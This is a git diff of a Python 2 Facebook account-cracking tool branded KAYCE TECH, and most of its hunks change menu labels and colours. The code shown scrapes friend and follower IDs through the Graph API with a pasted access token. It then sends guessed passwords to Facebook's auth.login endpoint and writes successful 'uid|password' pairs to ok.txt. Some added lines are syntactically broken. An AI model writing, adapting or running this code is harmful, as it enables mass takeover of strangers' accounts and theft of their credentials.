@@ -95,26 +95,26 @@ while (loop == 'true'):
         print "salah sayang!"
         os.system('xdg-open https://wa.me/+2349066073100')	
 def logo():
-		os.system('echo  "\n\n ✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓\n    ║ TOOL NAME: { BANK}        ║\n    ║ AUTHOR   : KAYCE TECH❤️            ║\n    ║ GITHUB   : KAYCE3125       ║\n    ✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓" | lolcat -a -d 2 -s 50')	
+		os.system('echo  "\n\n ✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓\n    ║ TOOL NAME: { BANK}       \n    ║ AUTHOR   : KAYCE TECH❤️           \n    ║ GITHUB   : KAYCE3125      \n    ✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓" | lolcat -a -d 2 -s 50')	
 
 def main():
 	os.system("clear")
 	logo()
 	print("\t\033[93;1m      MAIN MENU\x1b[0m")
 	print("")
-	print("\033[92;1m  [1] START CRACK")
-	print("\033[93;1m  [2] CLONE USER IDS")
-	print("\033[94;1m  [3] BUY ACCESS TOKEN APP")
-	print("\033[96;1m  [4] ADMIN")
-	print("\033[92;1m  [5] UPDATE TOOL")
-	print("\033[91;1m  [0] EXIT")
+	print("\033[92;1m  [01] START CRACKING ACCOUNT")
+	print("\033[92;1m  [02] CLONE USER IDS")
+	print("\033[92;1m  [03] BUY ACCESS TOKEN APP FOR HACKING")
+	print("\033[92;1m  [04] MESSAGE ADMIN")
+	print("\033[92;1m  [05] UPDATE KAYCE HACKING TOOL")
+	print("\033[92;1m  [00] EXIT")
 	print("")
 	log_sel()
 	
 def log_sel():
-	sel = raw_input("\033[93;1m  CHOOSE: ")
+	sel = raw_input("\033[92;1m  CHOOSE: ")
 	if sel == "":
-		print("\t\033[91;1m  SELECT AN OPTION STUPID -_")
+		print("\t\033[92;1m  SELECT AN OPTION STUPID -_")
 		log_sel()
 	elif sel =="1" or sel =="01":
 		token()
@@ -129,22 +129,22 @@ def log_sel():
 	elif sel =="5" or sel =="05":
 		import os
 		try:
-			os.system("git clone https://github.com/KAYCE3125/Bini")
-			os.system("rm -rf BANK")
-			os.system("cp -f BANK/BADDEST.py \\.")
-			os.system("rm -rf BANK")
+			os.system("git clone https://github.com/kayce3125/kayce3125.git")
+			os.system("rm -rf KAYCE")
+			os.system("cp -f KAYCE \\.")
+			os.system("rm -rf KAYCE")
 			print "\033[92;1m\n TOOL UPDATE SUCCESSFULFUL...>_<\n"
 			time.sleep(2)
 			main()
 		except KeyboardInterrupt:
-			print "\033[91;1m\n YOUR DEVICE IS NOT SUPPORTED!\n"
+			print "\033[92;1m\n YOUR DEVICE IS NOT SUPPORTED!\n"
 	        	main()
 	elif sel =="0" or sel =="00":
-		xox("\n\t\033[91;1m GOOD BYE SEE YOU AGAIN :)")
+		xox("\n\t\033[92;1m GOOD BYE SEE YOU AGAIN :)")
 		sys.exit()
 	else:
 		print("")
-		print("\t\033[91;1m  SELECT VALID OPTION")
+		print("\t\033[92;1m  SELECT VALID OPTION")
 		print("")
 		log_sel()
 
@@ -158,7 +158,7 @@ def token():
         print("")
         print("\t\033[92;1m  LOGIN TOKEN")
         print("")
-        token = raw_input("\033[93;1m PASTE TOKEN HERE: \033[92;1m")
+        token = raw_input("\033[92;1m PASTE TOKEN HERE: \033[92;1m")
         sav = open("vau_token.txt", "w")
         sav.write(token)
         sav.close()
@@ -196,9 +196,10 @@ def menu():
     xn = name.upper()
     logo()
     print("")
-    print("\033[93;1m     HELLO, WELCOME 🤗!   : \033[92;1m"+xn)
-    print("\033[93;1m    CURRENT COUNTRY  : \033[92;1m") + loc
-    print("\033[93;1m     YOUR DEVICE IP : \033[92;1m") + ip
+    print("\033[92;1m     HELLO, WELCOME 🤗!   : \033[92;1m"+xn)
+    print("\033[92;1m     CURRENT COUNTRY BY DEVICE  : \033[92;1m") + loc
+    print("\033[92;1m     YOUR DEVICE IP : \033[92;1m") + ip
+    print("\033[92;1m     YOUR DEVICE NAME : \033[92;1m") + UNKNOWN (still loading...)
     print("")
 
     print("")
@@ -219,7 +220,7 @@ def menu_option():
 		main()
 	else:
 		print("")
-		print("\t\033[91;1m     SELECT VALID OPTION")
+		print("\t\033[92;1m     SELECT VALID OPTION")
 		print("")
 		menu_option()
 		
@@ -232,16 +233,16 @@ def crack1():
 		token = open("vau_token.txt","r").read()
 	except IOError:
 		print("")
-		print("\t\033[91;1m     TOKEN NOT FOUND ")
+		print("\t\033[92;1m     TOKEN NOT FOUND ")
 		time.sleep(1)
 		token()
 	os.system("clear")
 	logo()
 	print("")
-	print("\t\033[93;1m CLONE WITH AUTO PASS")
+	print("\t\033[92;1m CLONE WITH AUTO PASS")
 	print("")
-	print("\033[94;1m  [1] CLONE PUBLIC ID")
-	print("\033[93;1m  [2] CLONE FOLLOWERS")
+	print("\033[92;1m  [1] CLONE PUBLIC ID")
+	print("\033[92;1m  [2] CLONE FOLLOWERS")
 	print("\033[92;1m  [3] CLONE FILE")
 	print("")
 	crack_select1()
@@ -262,13 +263,13 @@ def crack_select1():
 			os.system('clear')
 			logo()
 			print('')
-			print("\t\033[93;1m  AUTO PASS CRACKING")
+			print("\t\033[92;1m  AUTO PASS CRACKING")
 			print('')
 			print("\033[92;1m  COINING FROM : "+q["name"])
 		except KeyError:
-			print("\t\033[91;1m  INVALID LINK OR TOKEN")
+			print("\t\033[92;1m  INVALID LINK OR TOKEN")
 			print("")
-			raw_input("\033[91;1m  PRESS ENTER TO BACK")
+			raw_input("\033[92;1m  PRESS ENTER TO BACK")
 			crack1()
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
 		z = json.loads(r.text)
@@ -287,13 +288,13 @@ def crack_select1():
 			os.system('clear')
 			logo()
 			print('')
-			print("\t\033[93;1m  AUTO PASS CRACKING")
+			print("\t\033[92;1m  AUTO PASS CRACKING")
 			print('')
 			print("\033[92;1m  COINING FROM : "+q["name"])
 		except KeyError:
-			print("\t\033[91;1m     INVALID LINK OR TOKEN")
+			print("\t\033[92;1m     INVALID LINK OR TOKEN")
 			print("")
-			raw_input("\033[91;1m PRESS ENTER TO BACK")
+			raw_input("\033[92;1m PRESS ENTER TO BACK")
 			crack1()
 		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999")
 		z = json.loads(r.text)
@@ -313,20 +314,20 @@ def crack_select1():
 				id.append(line.strip())
 				
 		except IOError:
-			print("\t\033[91;1m  REQUESTED FILE NOT FOUND")
+			print("\t\033[92;1m  REQUESTED FILE NOT FOUND")
 			print("")
-			raw_input("\033[93;1m PRESS ENTER TO BACK")
+			raw_input("\033[92;1m PRESS ENTER TO BACK")
 			crack1()
 			
 	elif select =="0":
 	    menu()
 	else:
 		print("")
-		print("\t\033[91;1m  SELECT VALID OPTION")
+		print("\t\033[92;1m  SELECT VALID OPTION")
 		print("")
 		crack_select1()
-	print("\033[93;1m  TOTAL IDS : \033[92;1m"+str(len(id)))
-	print("\033[93;1m  THE PROCESS HAS STARTED")
+	print("\033[92;1m  TOTAL IDS : \033[92;1m"+str(len(id)))
+	print("\033[92;1m  THE PROCESS HAS STARTED")
 	print("\033[92;1m  KAYCETECH CLONING ACTIVATED \x1b[0m")
 	print("")
 	linex()
@@ -359,7 +360,7 @@ def crack_select1():
 					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 					q = json.loads(data)
 					if "access_token" in q and "EAAA" in q:
-						print(" \033[1;32m [CHIGOZIE-OK] "+uid+" | "+pass2+"\033[0;97m")
+						print(" \033[1;32m [KAYCE-OK] "+uid+" | "+pass2+"\033[0;97m")
 						ok = open("ok.txt", "a")
 						ok.write(uid+"|"+pass2+"\n")
 						ok.close()
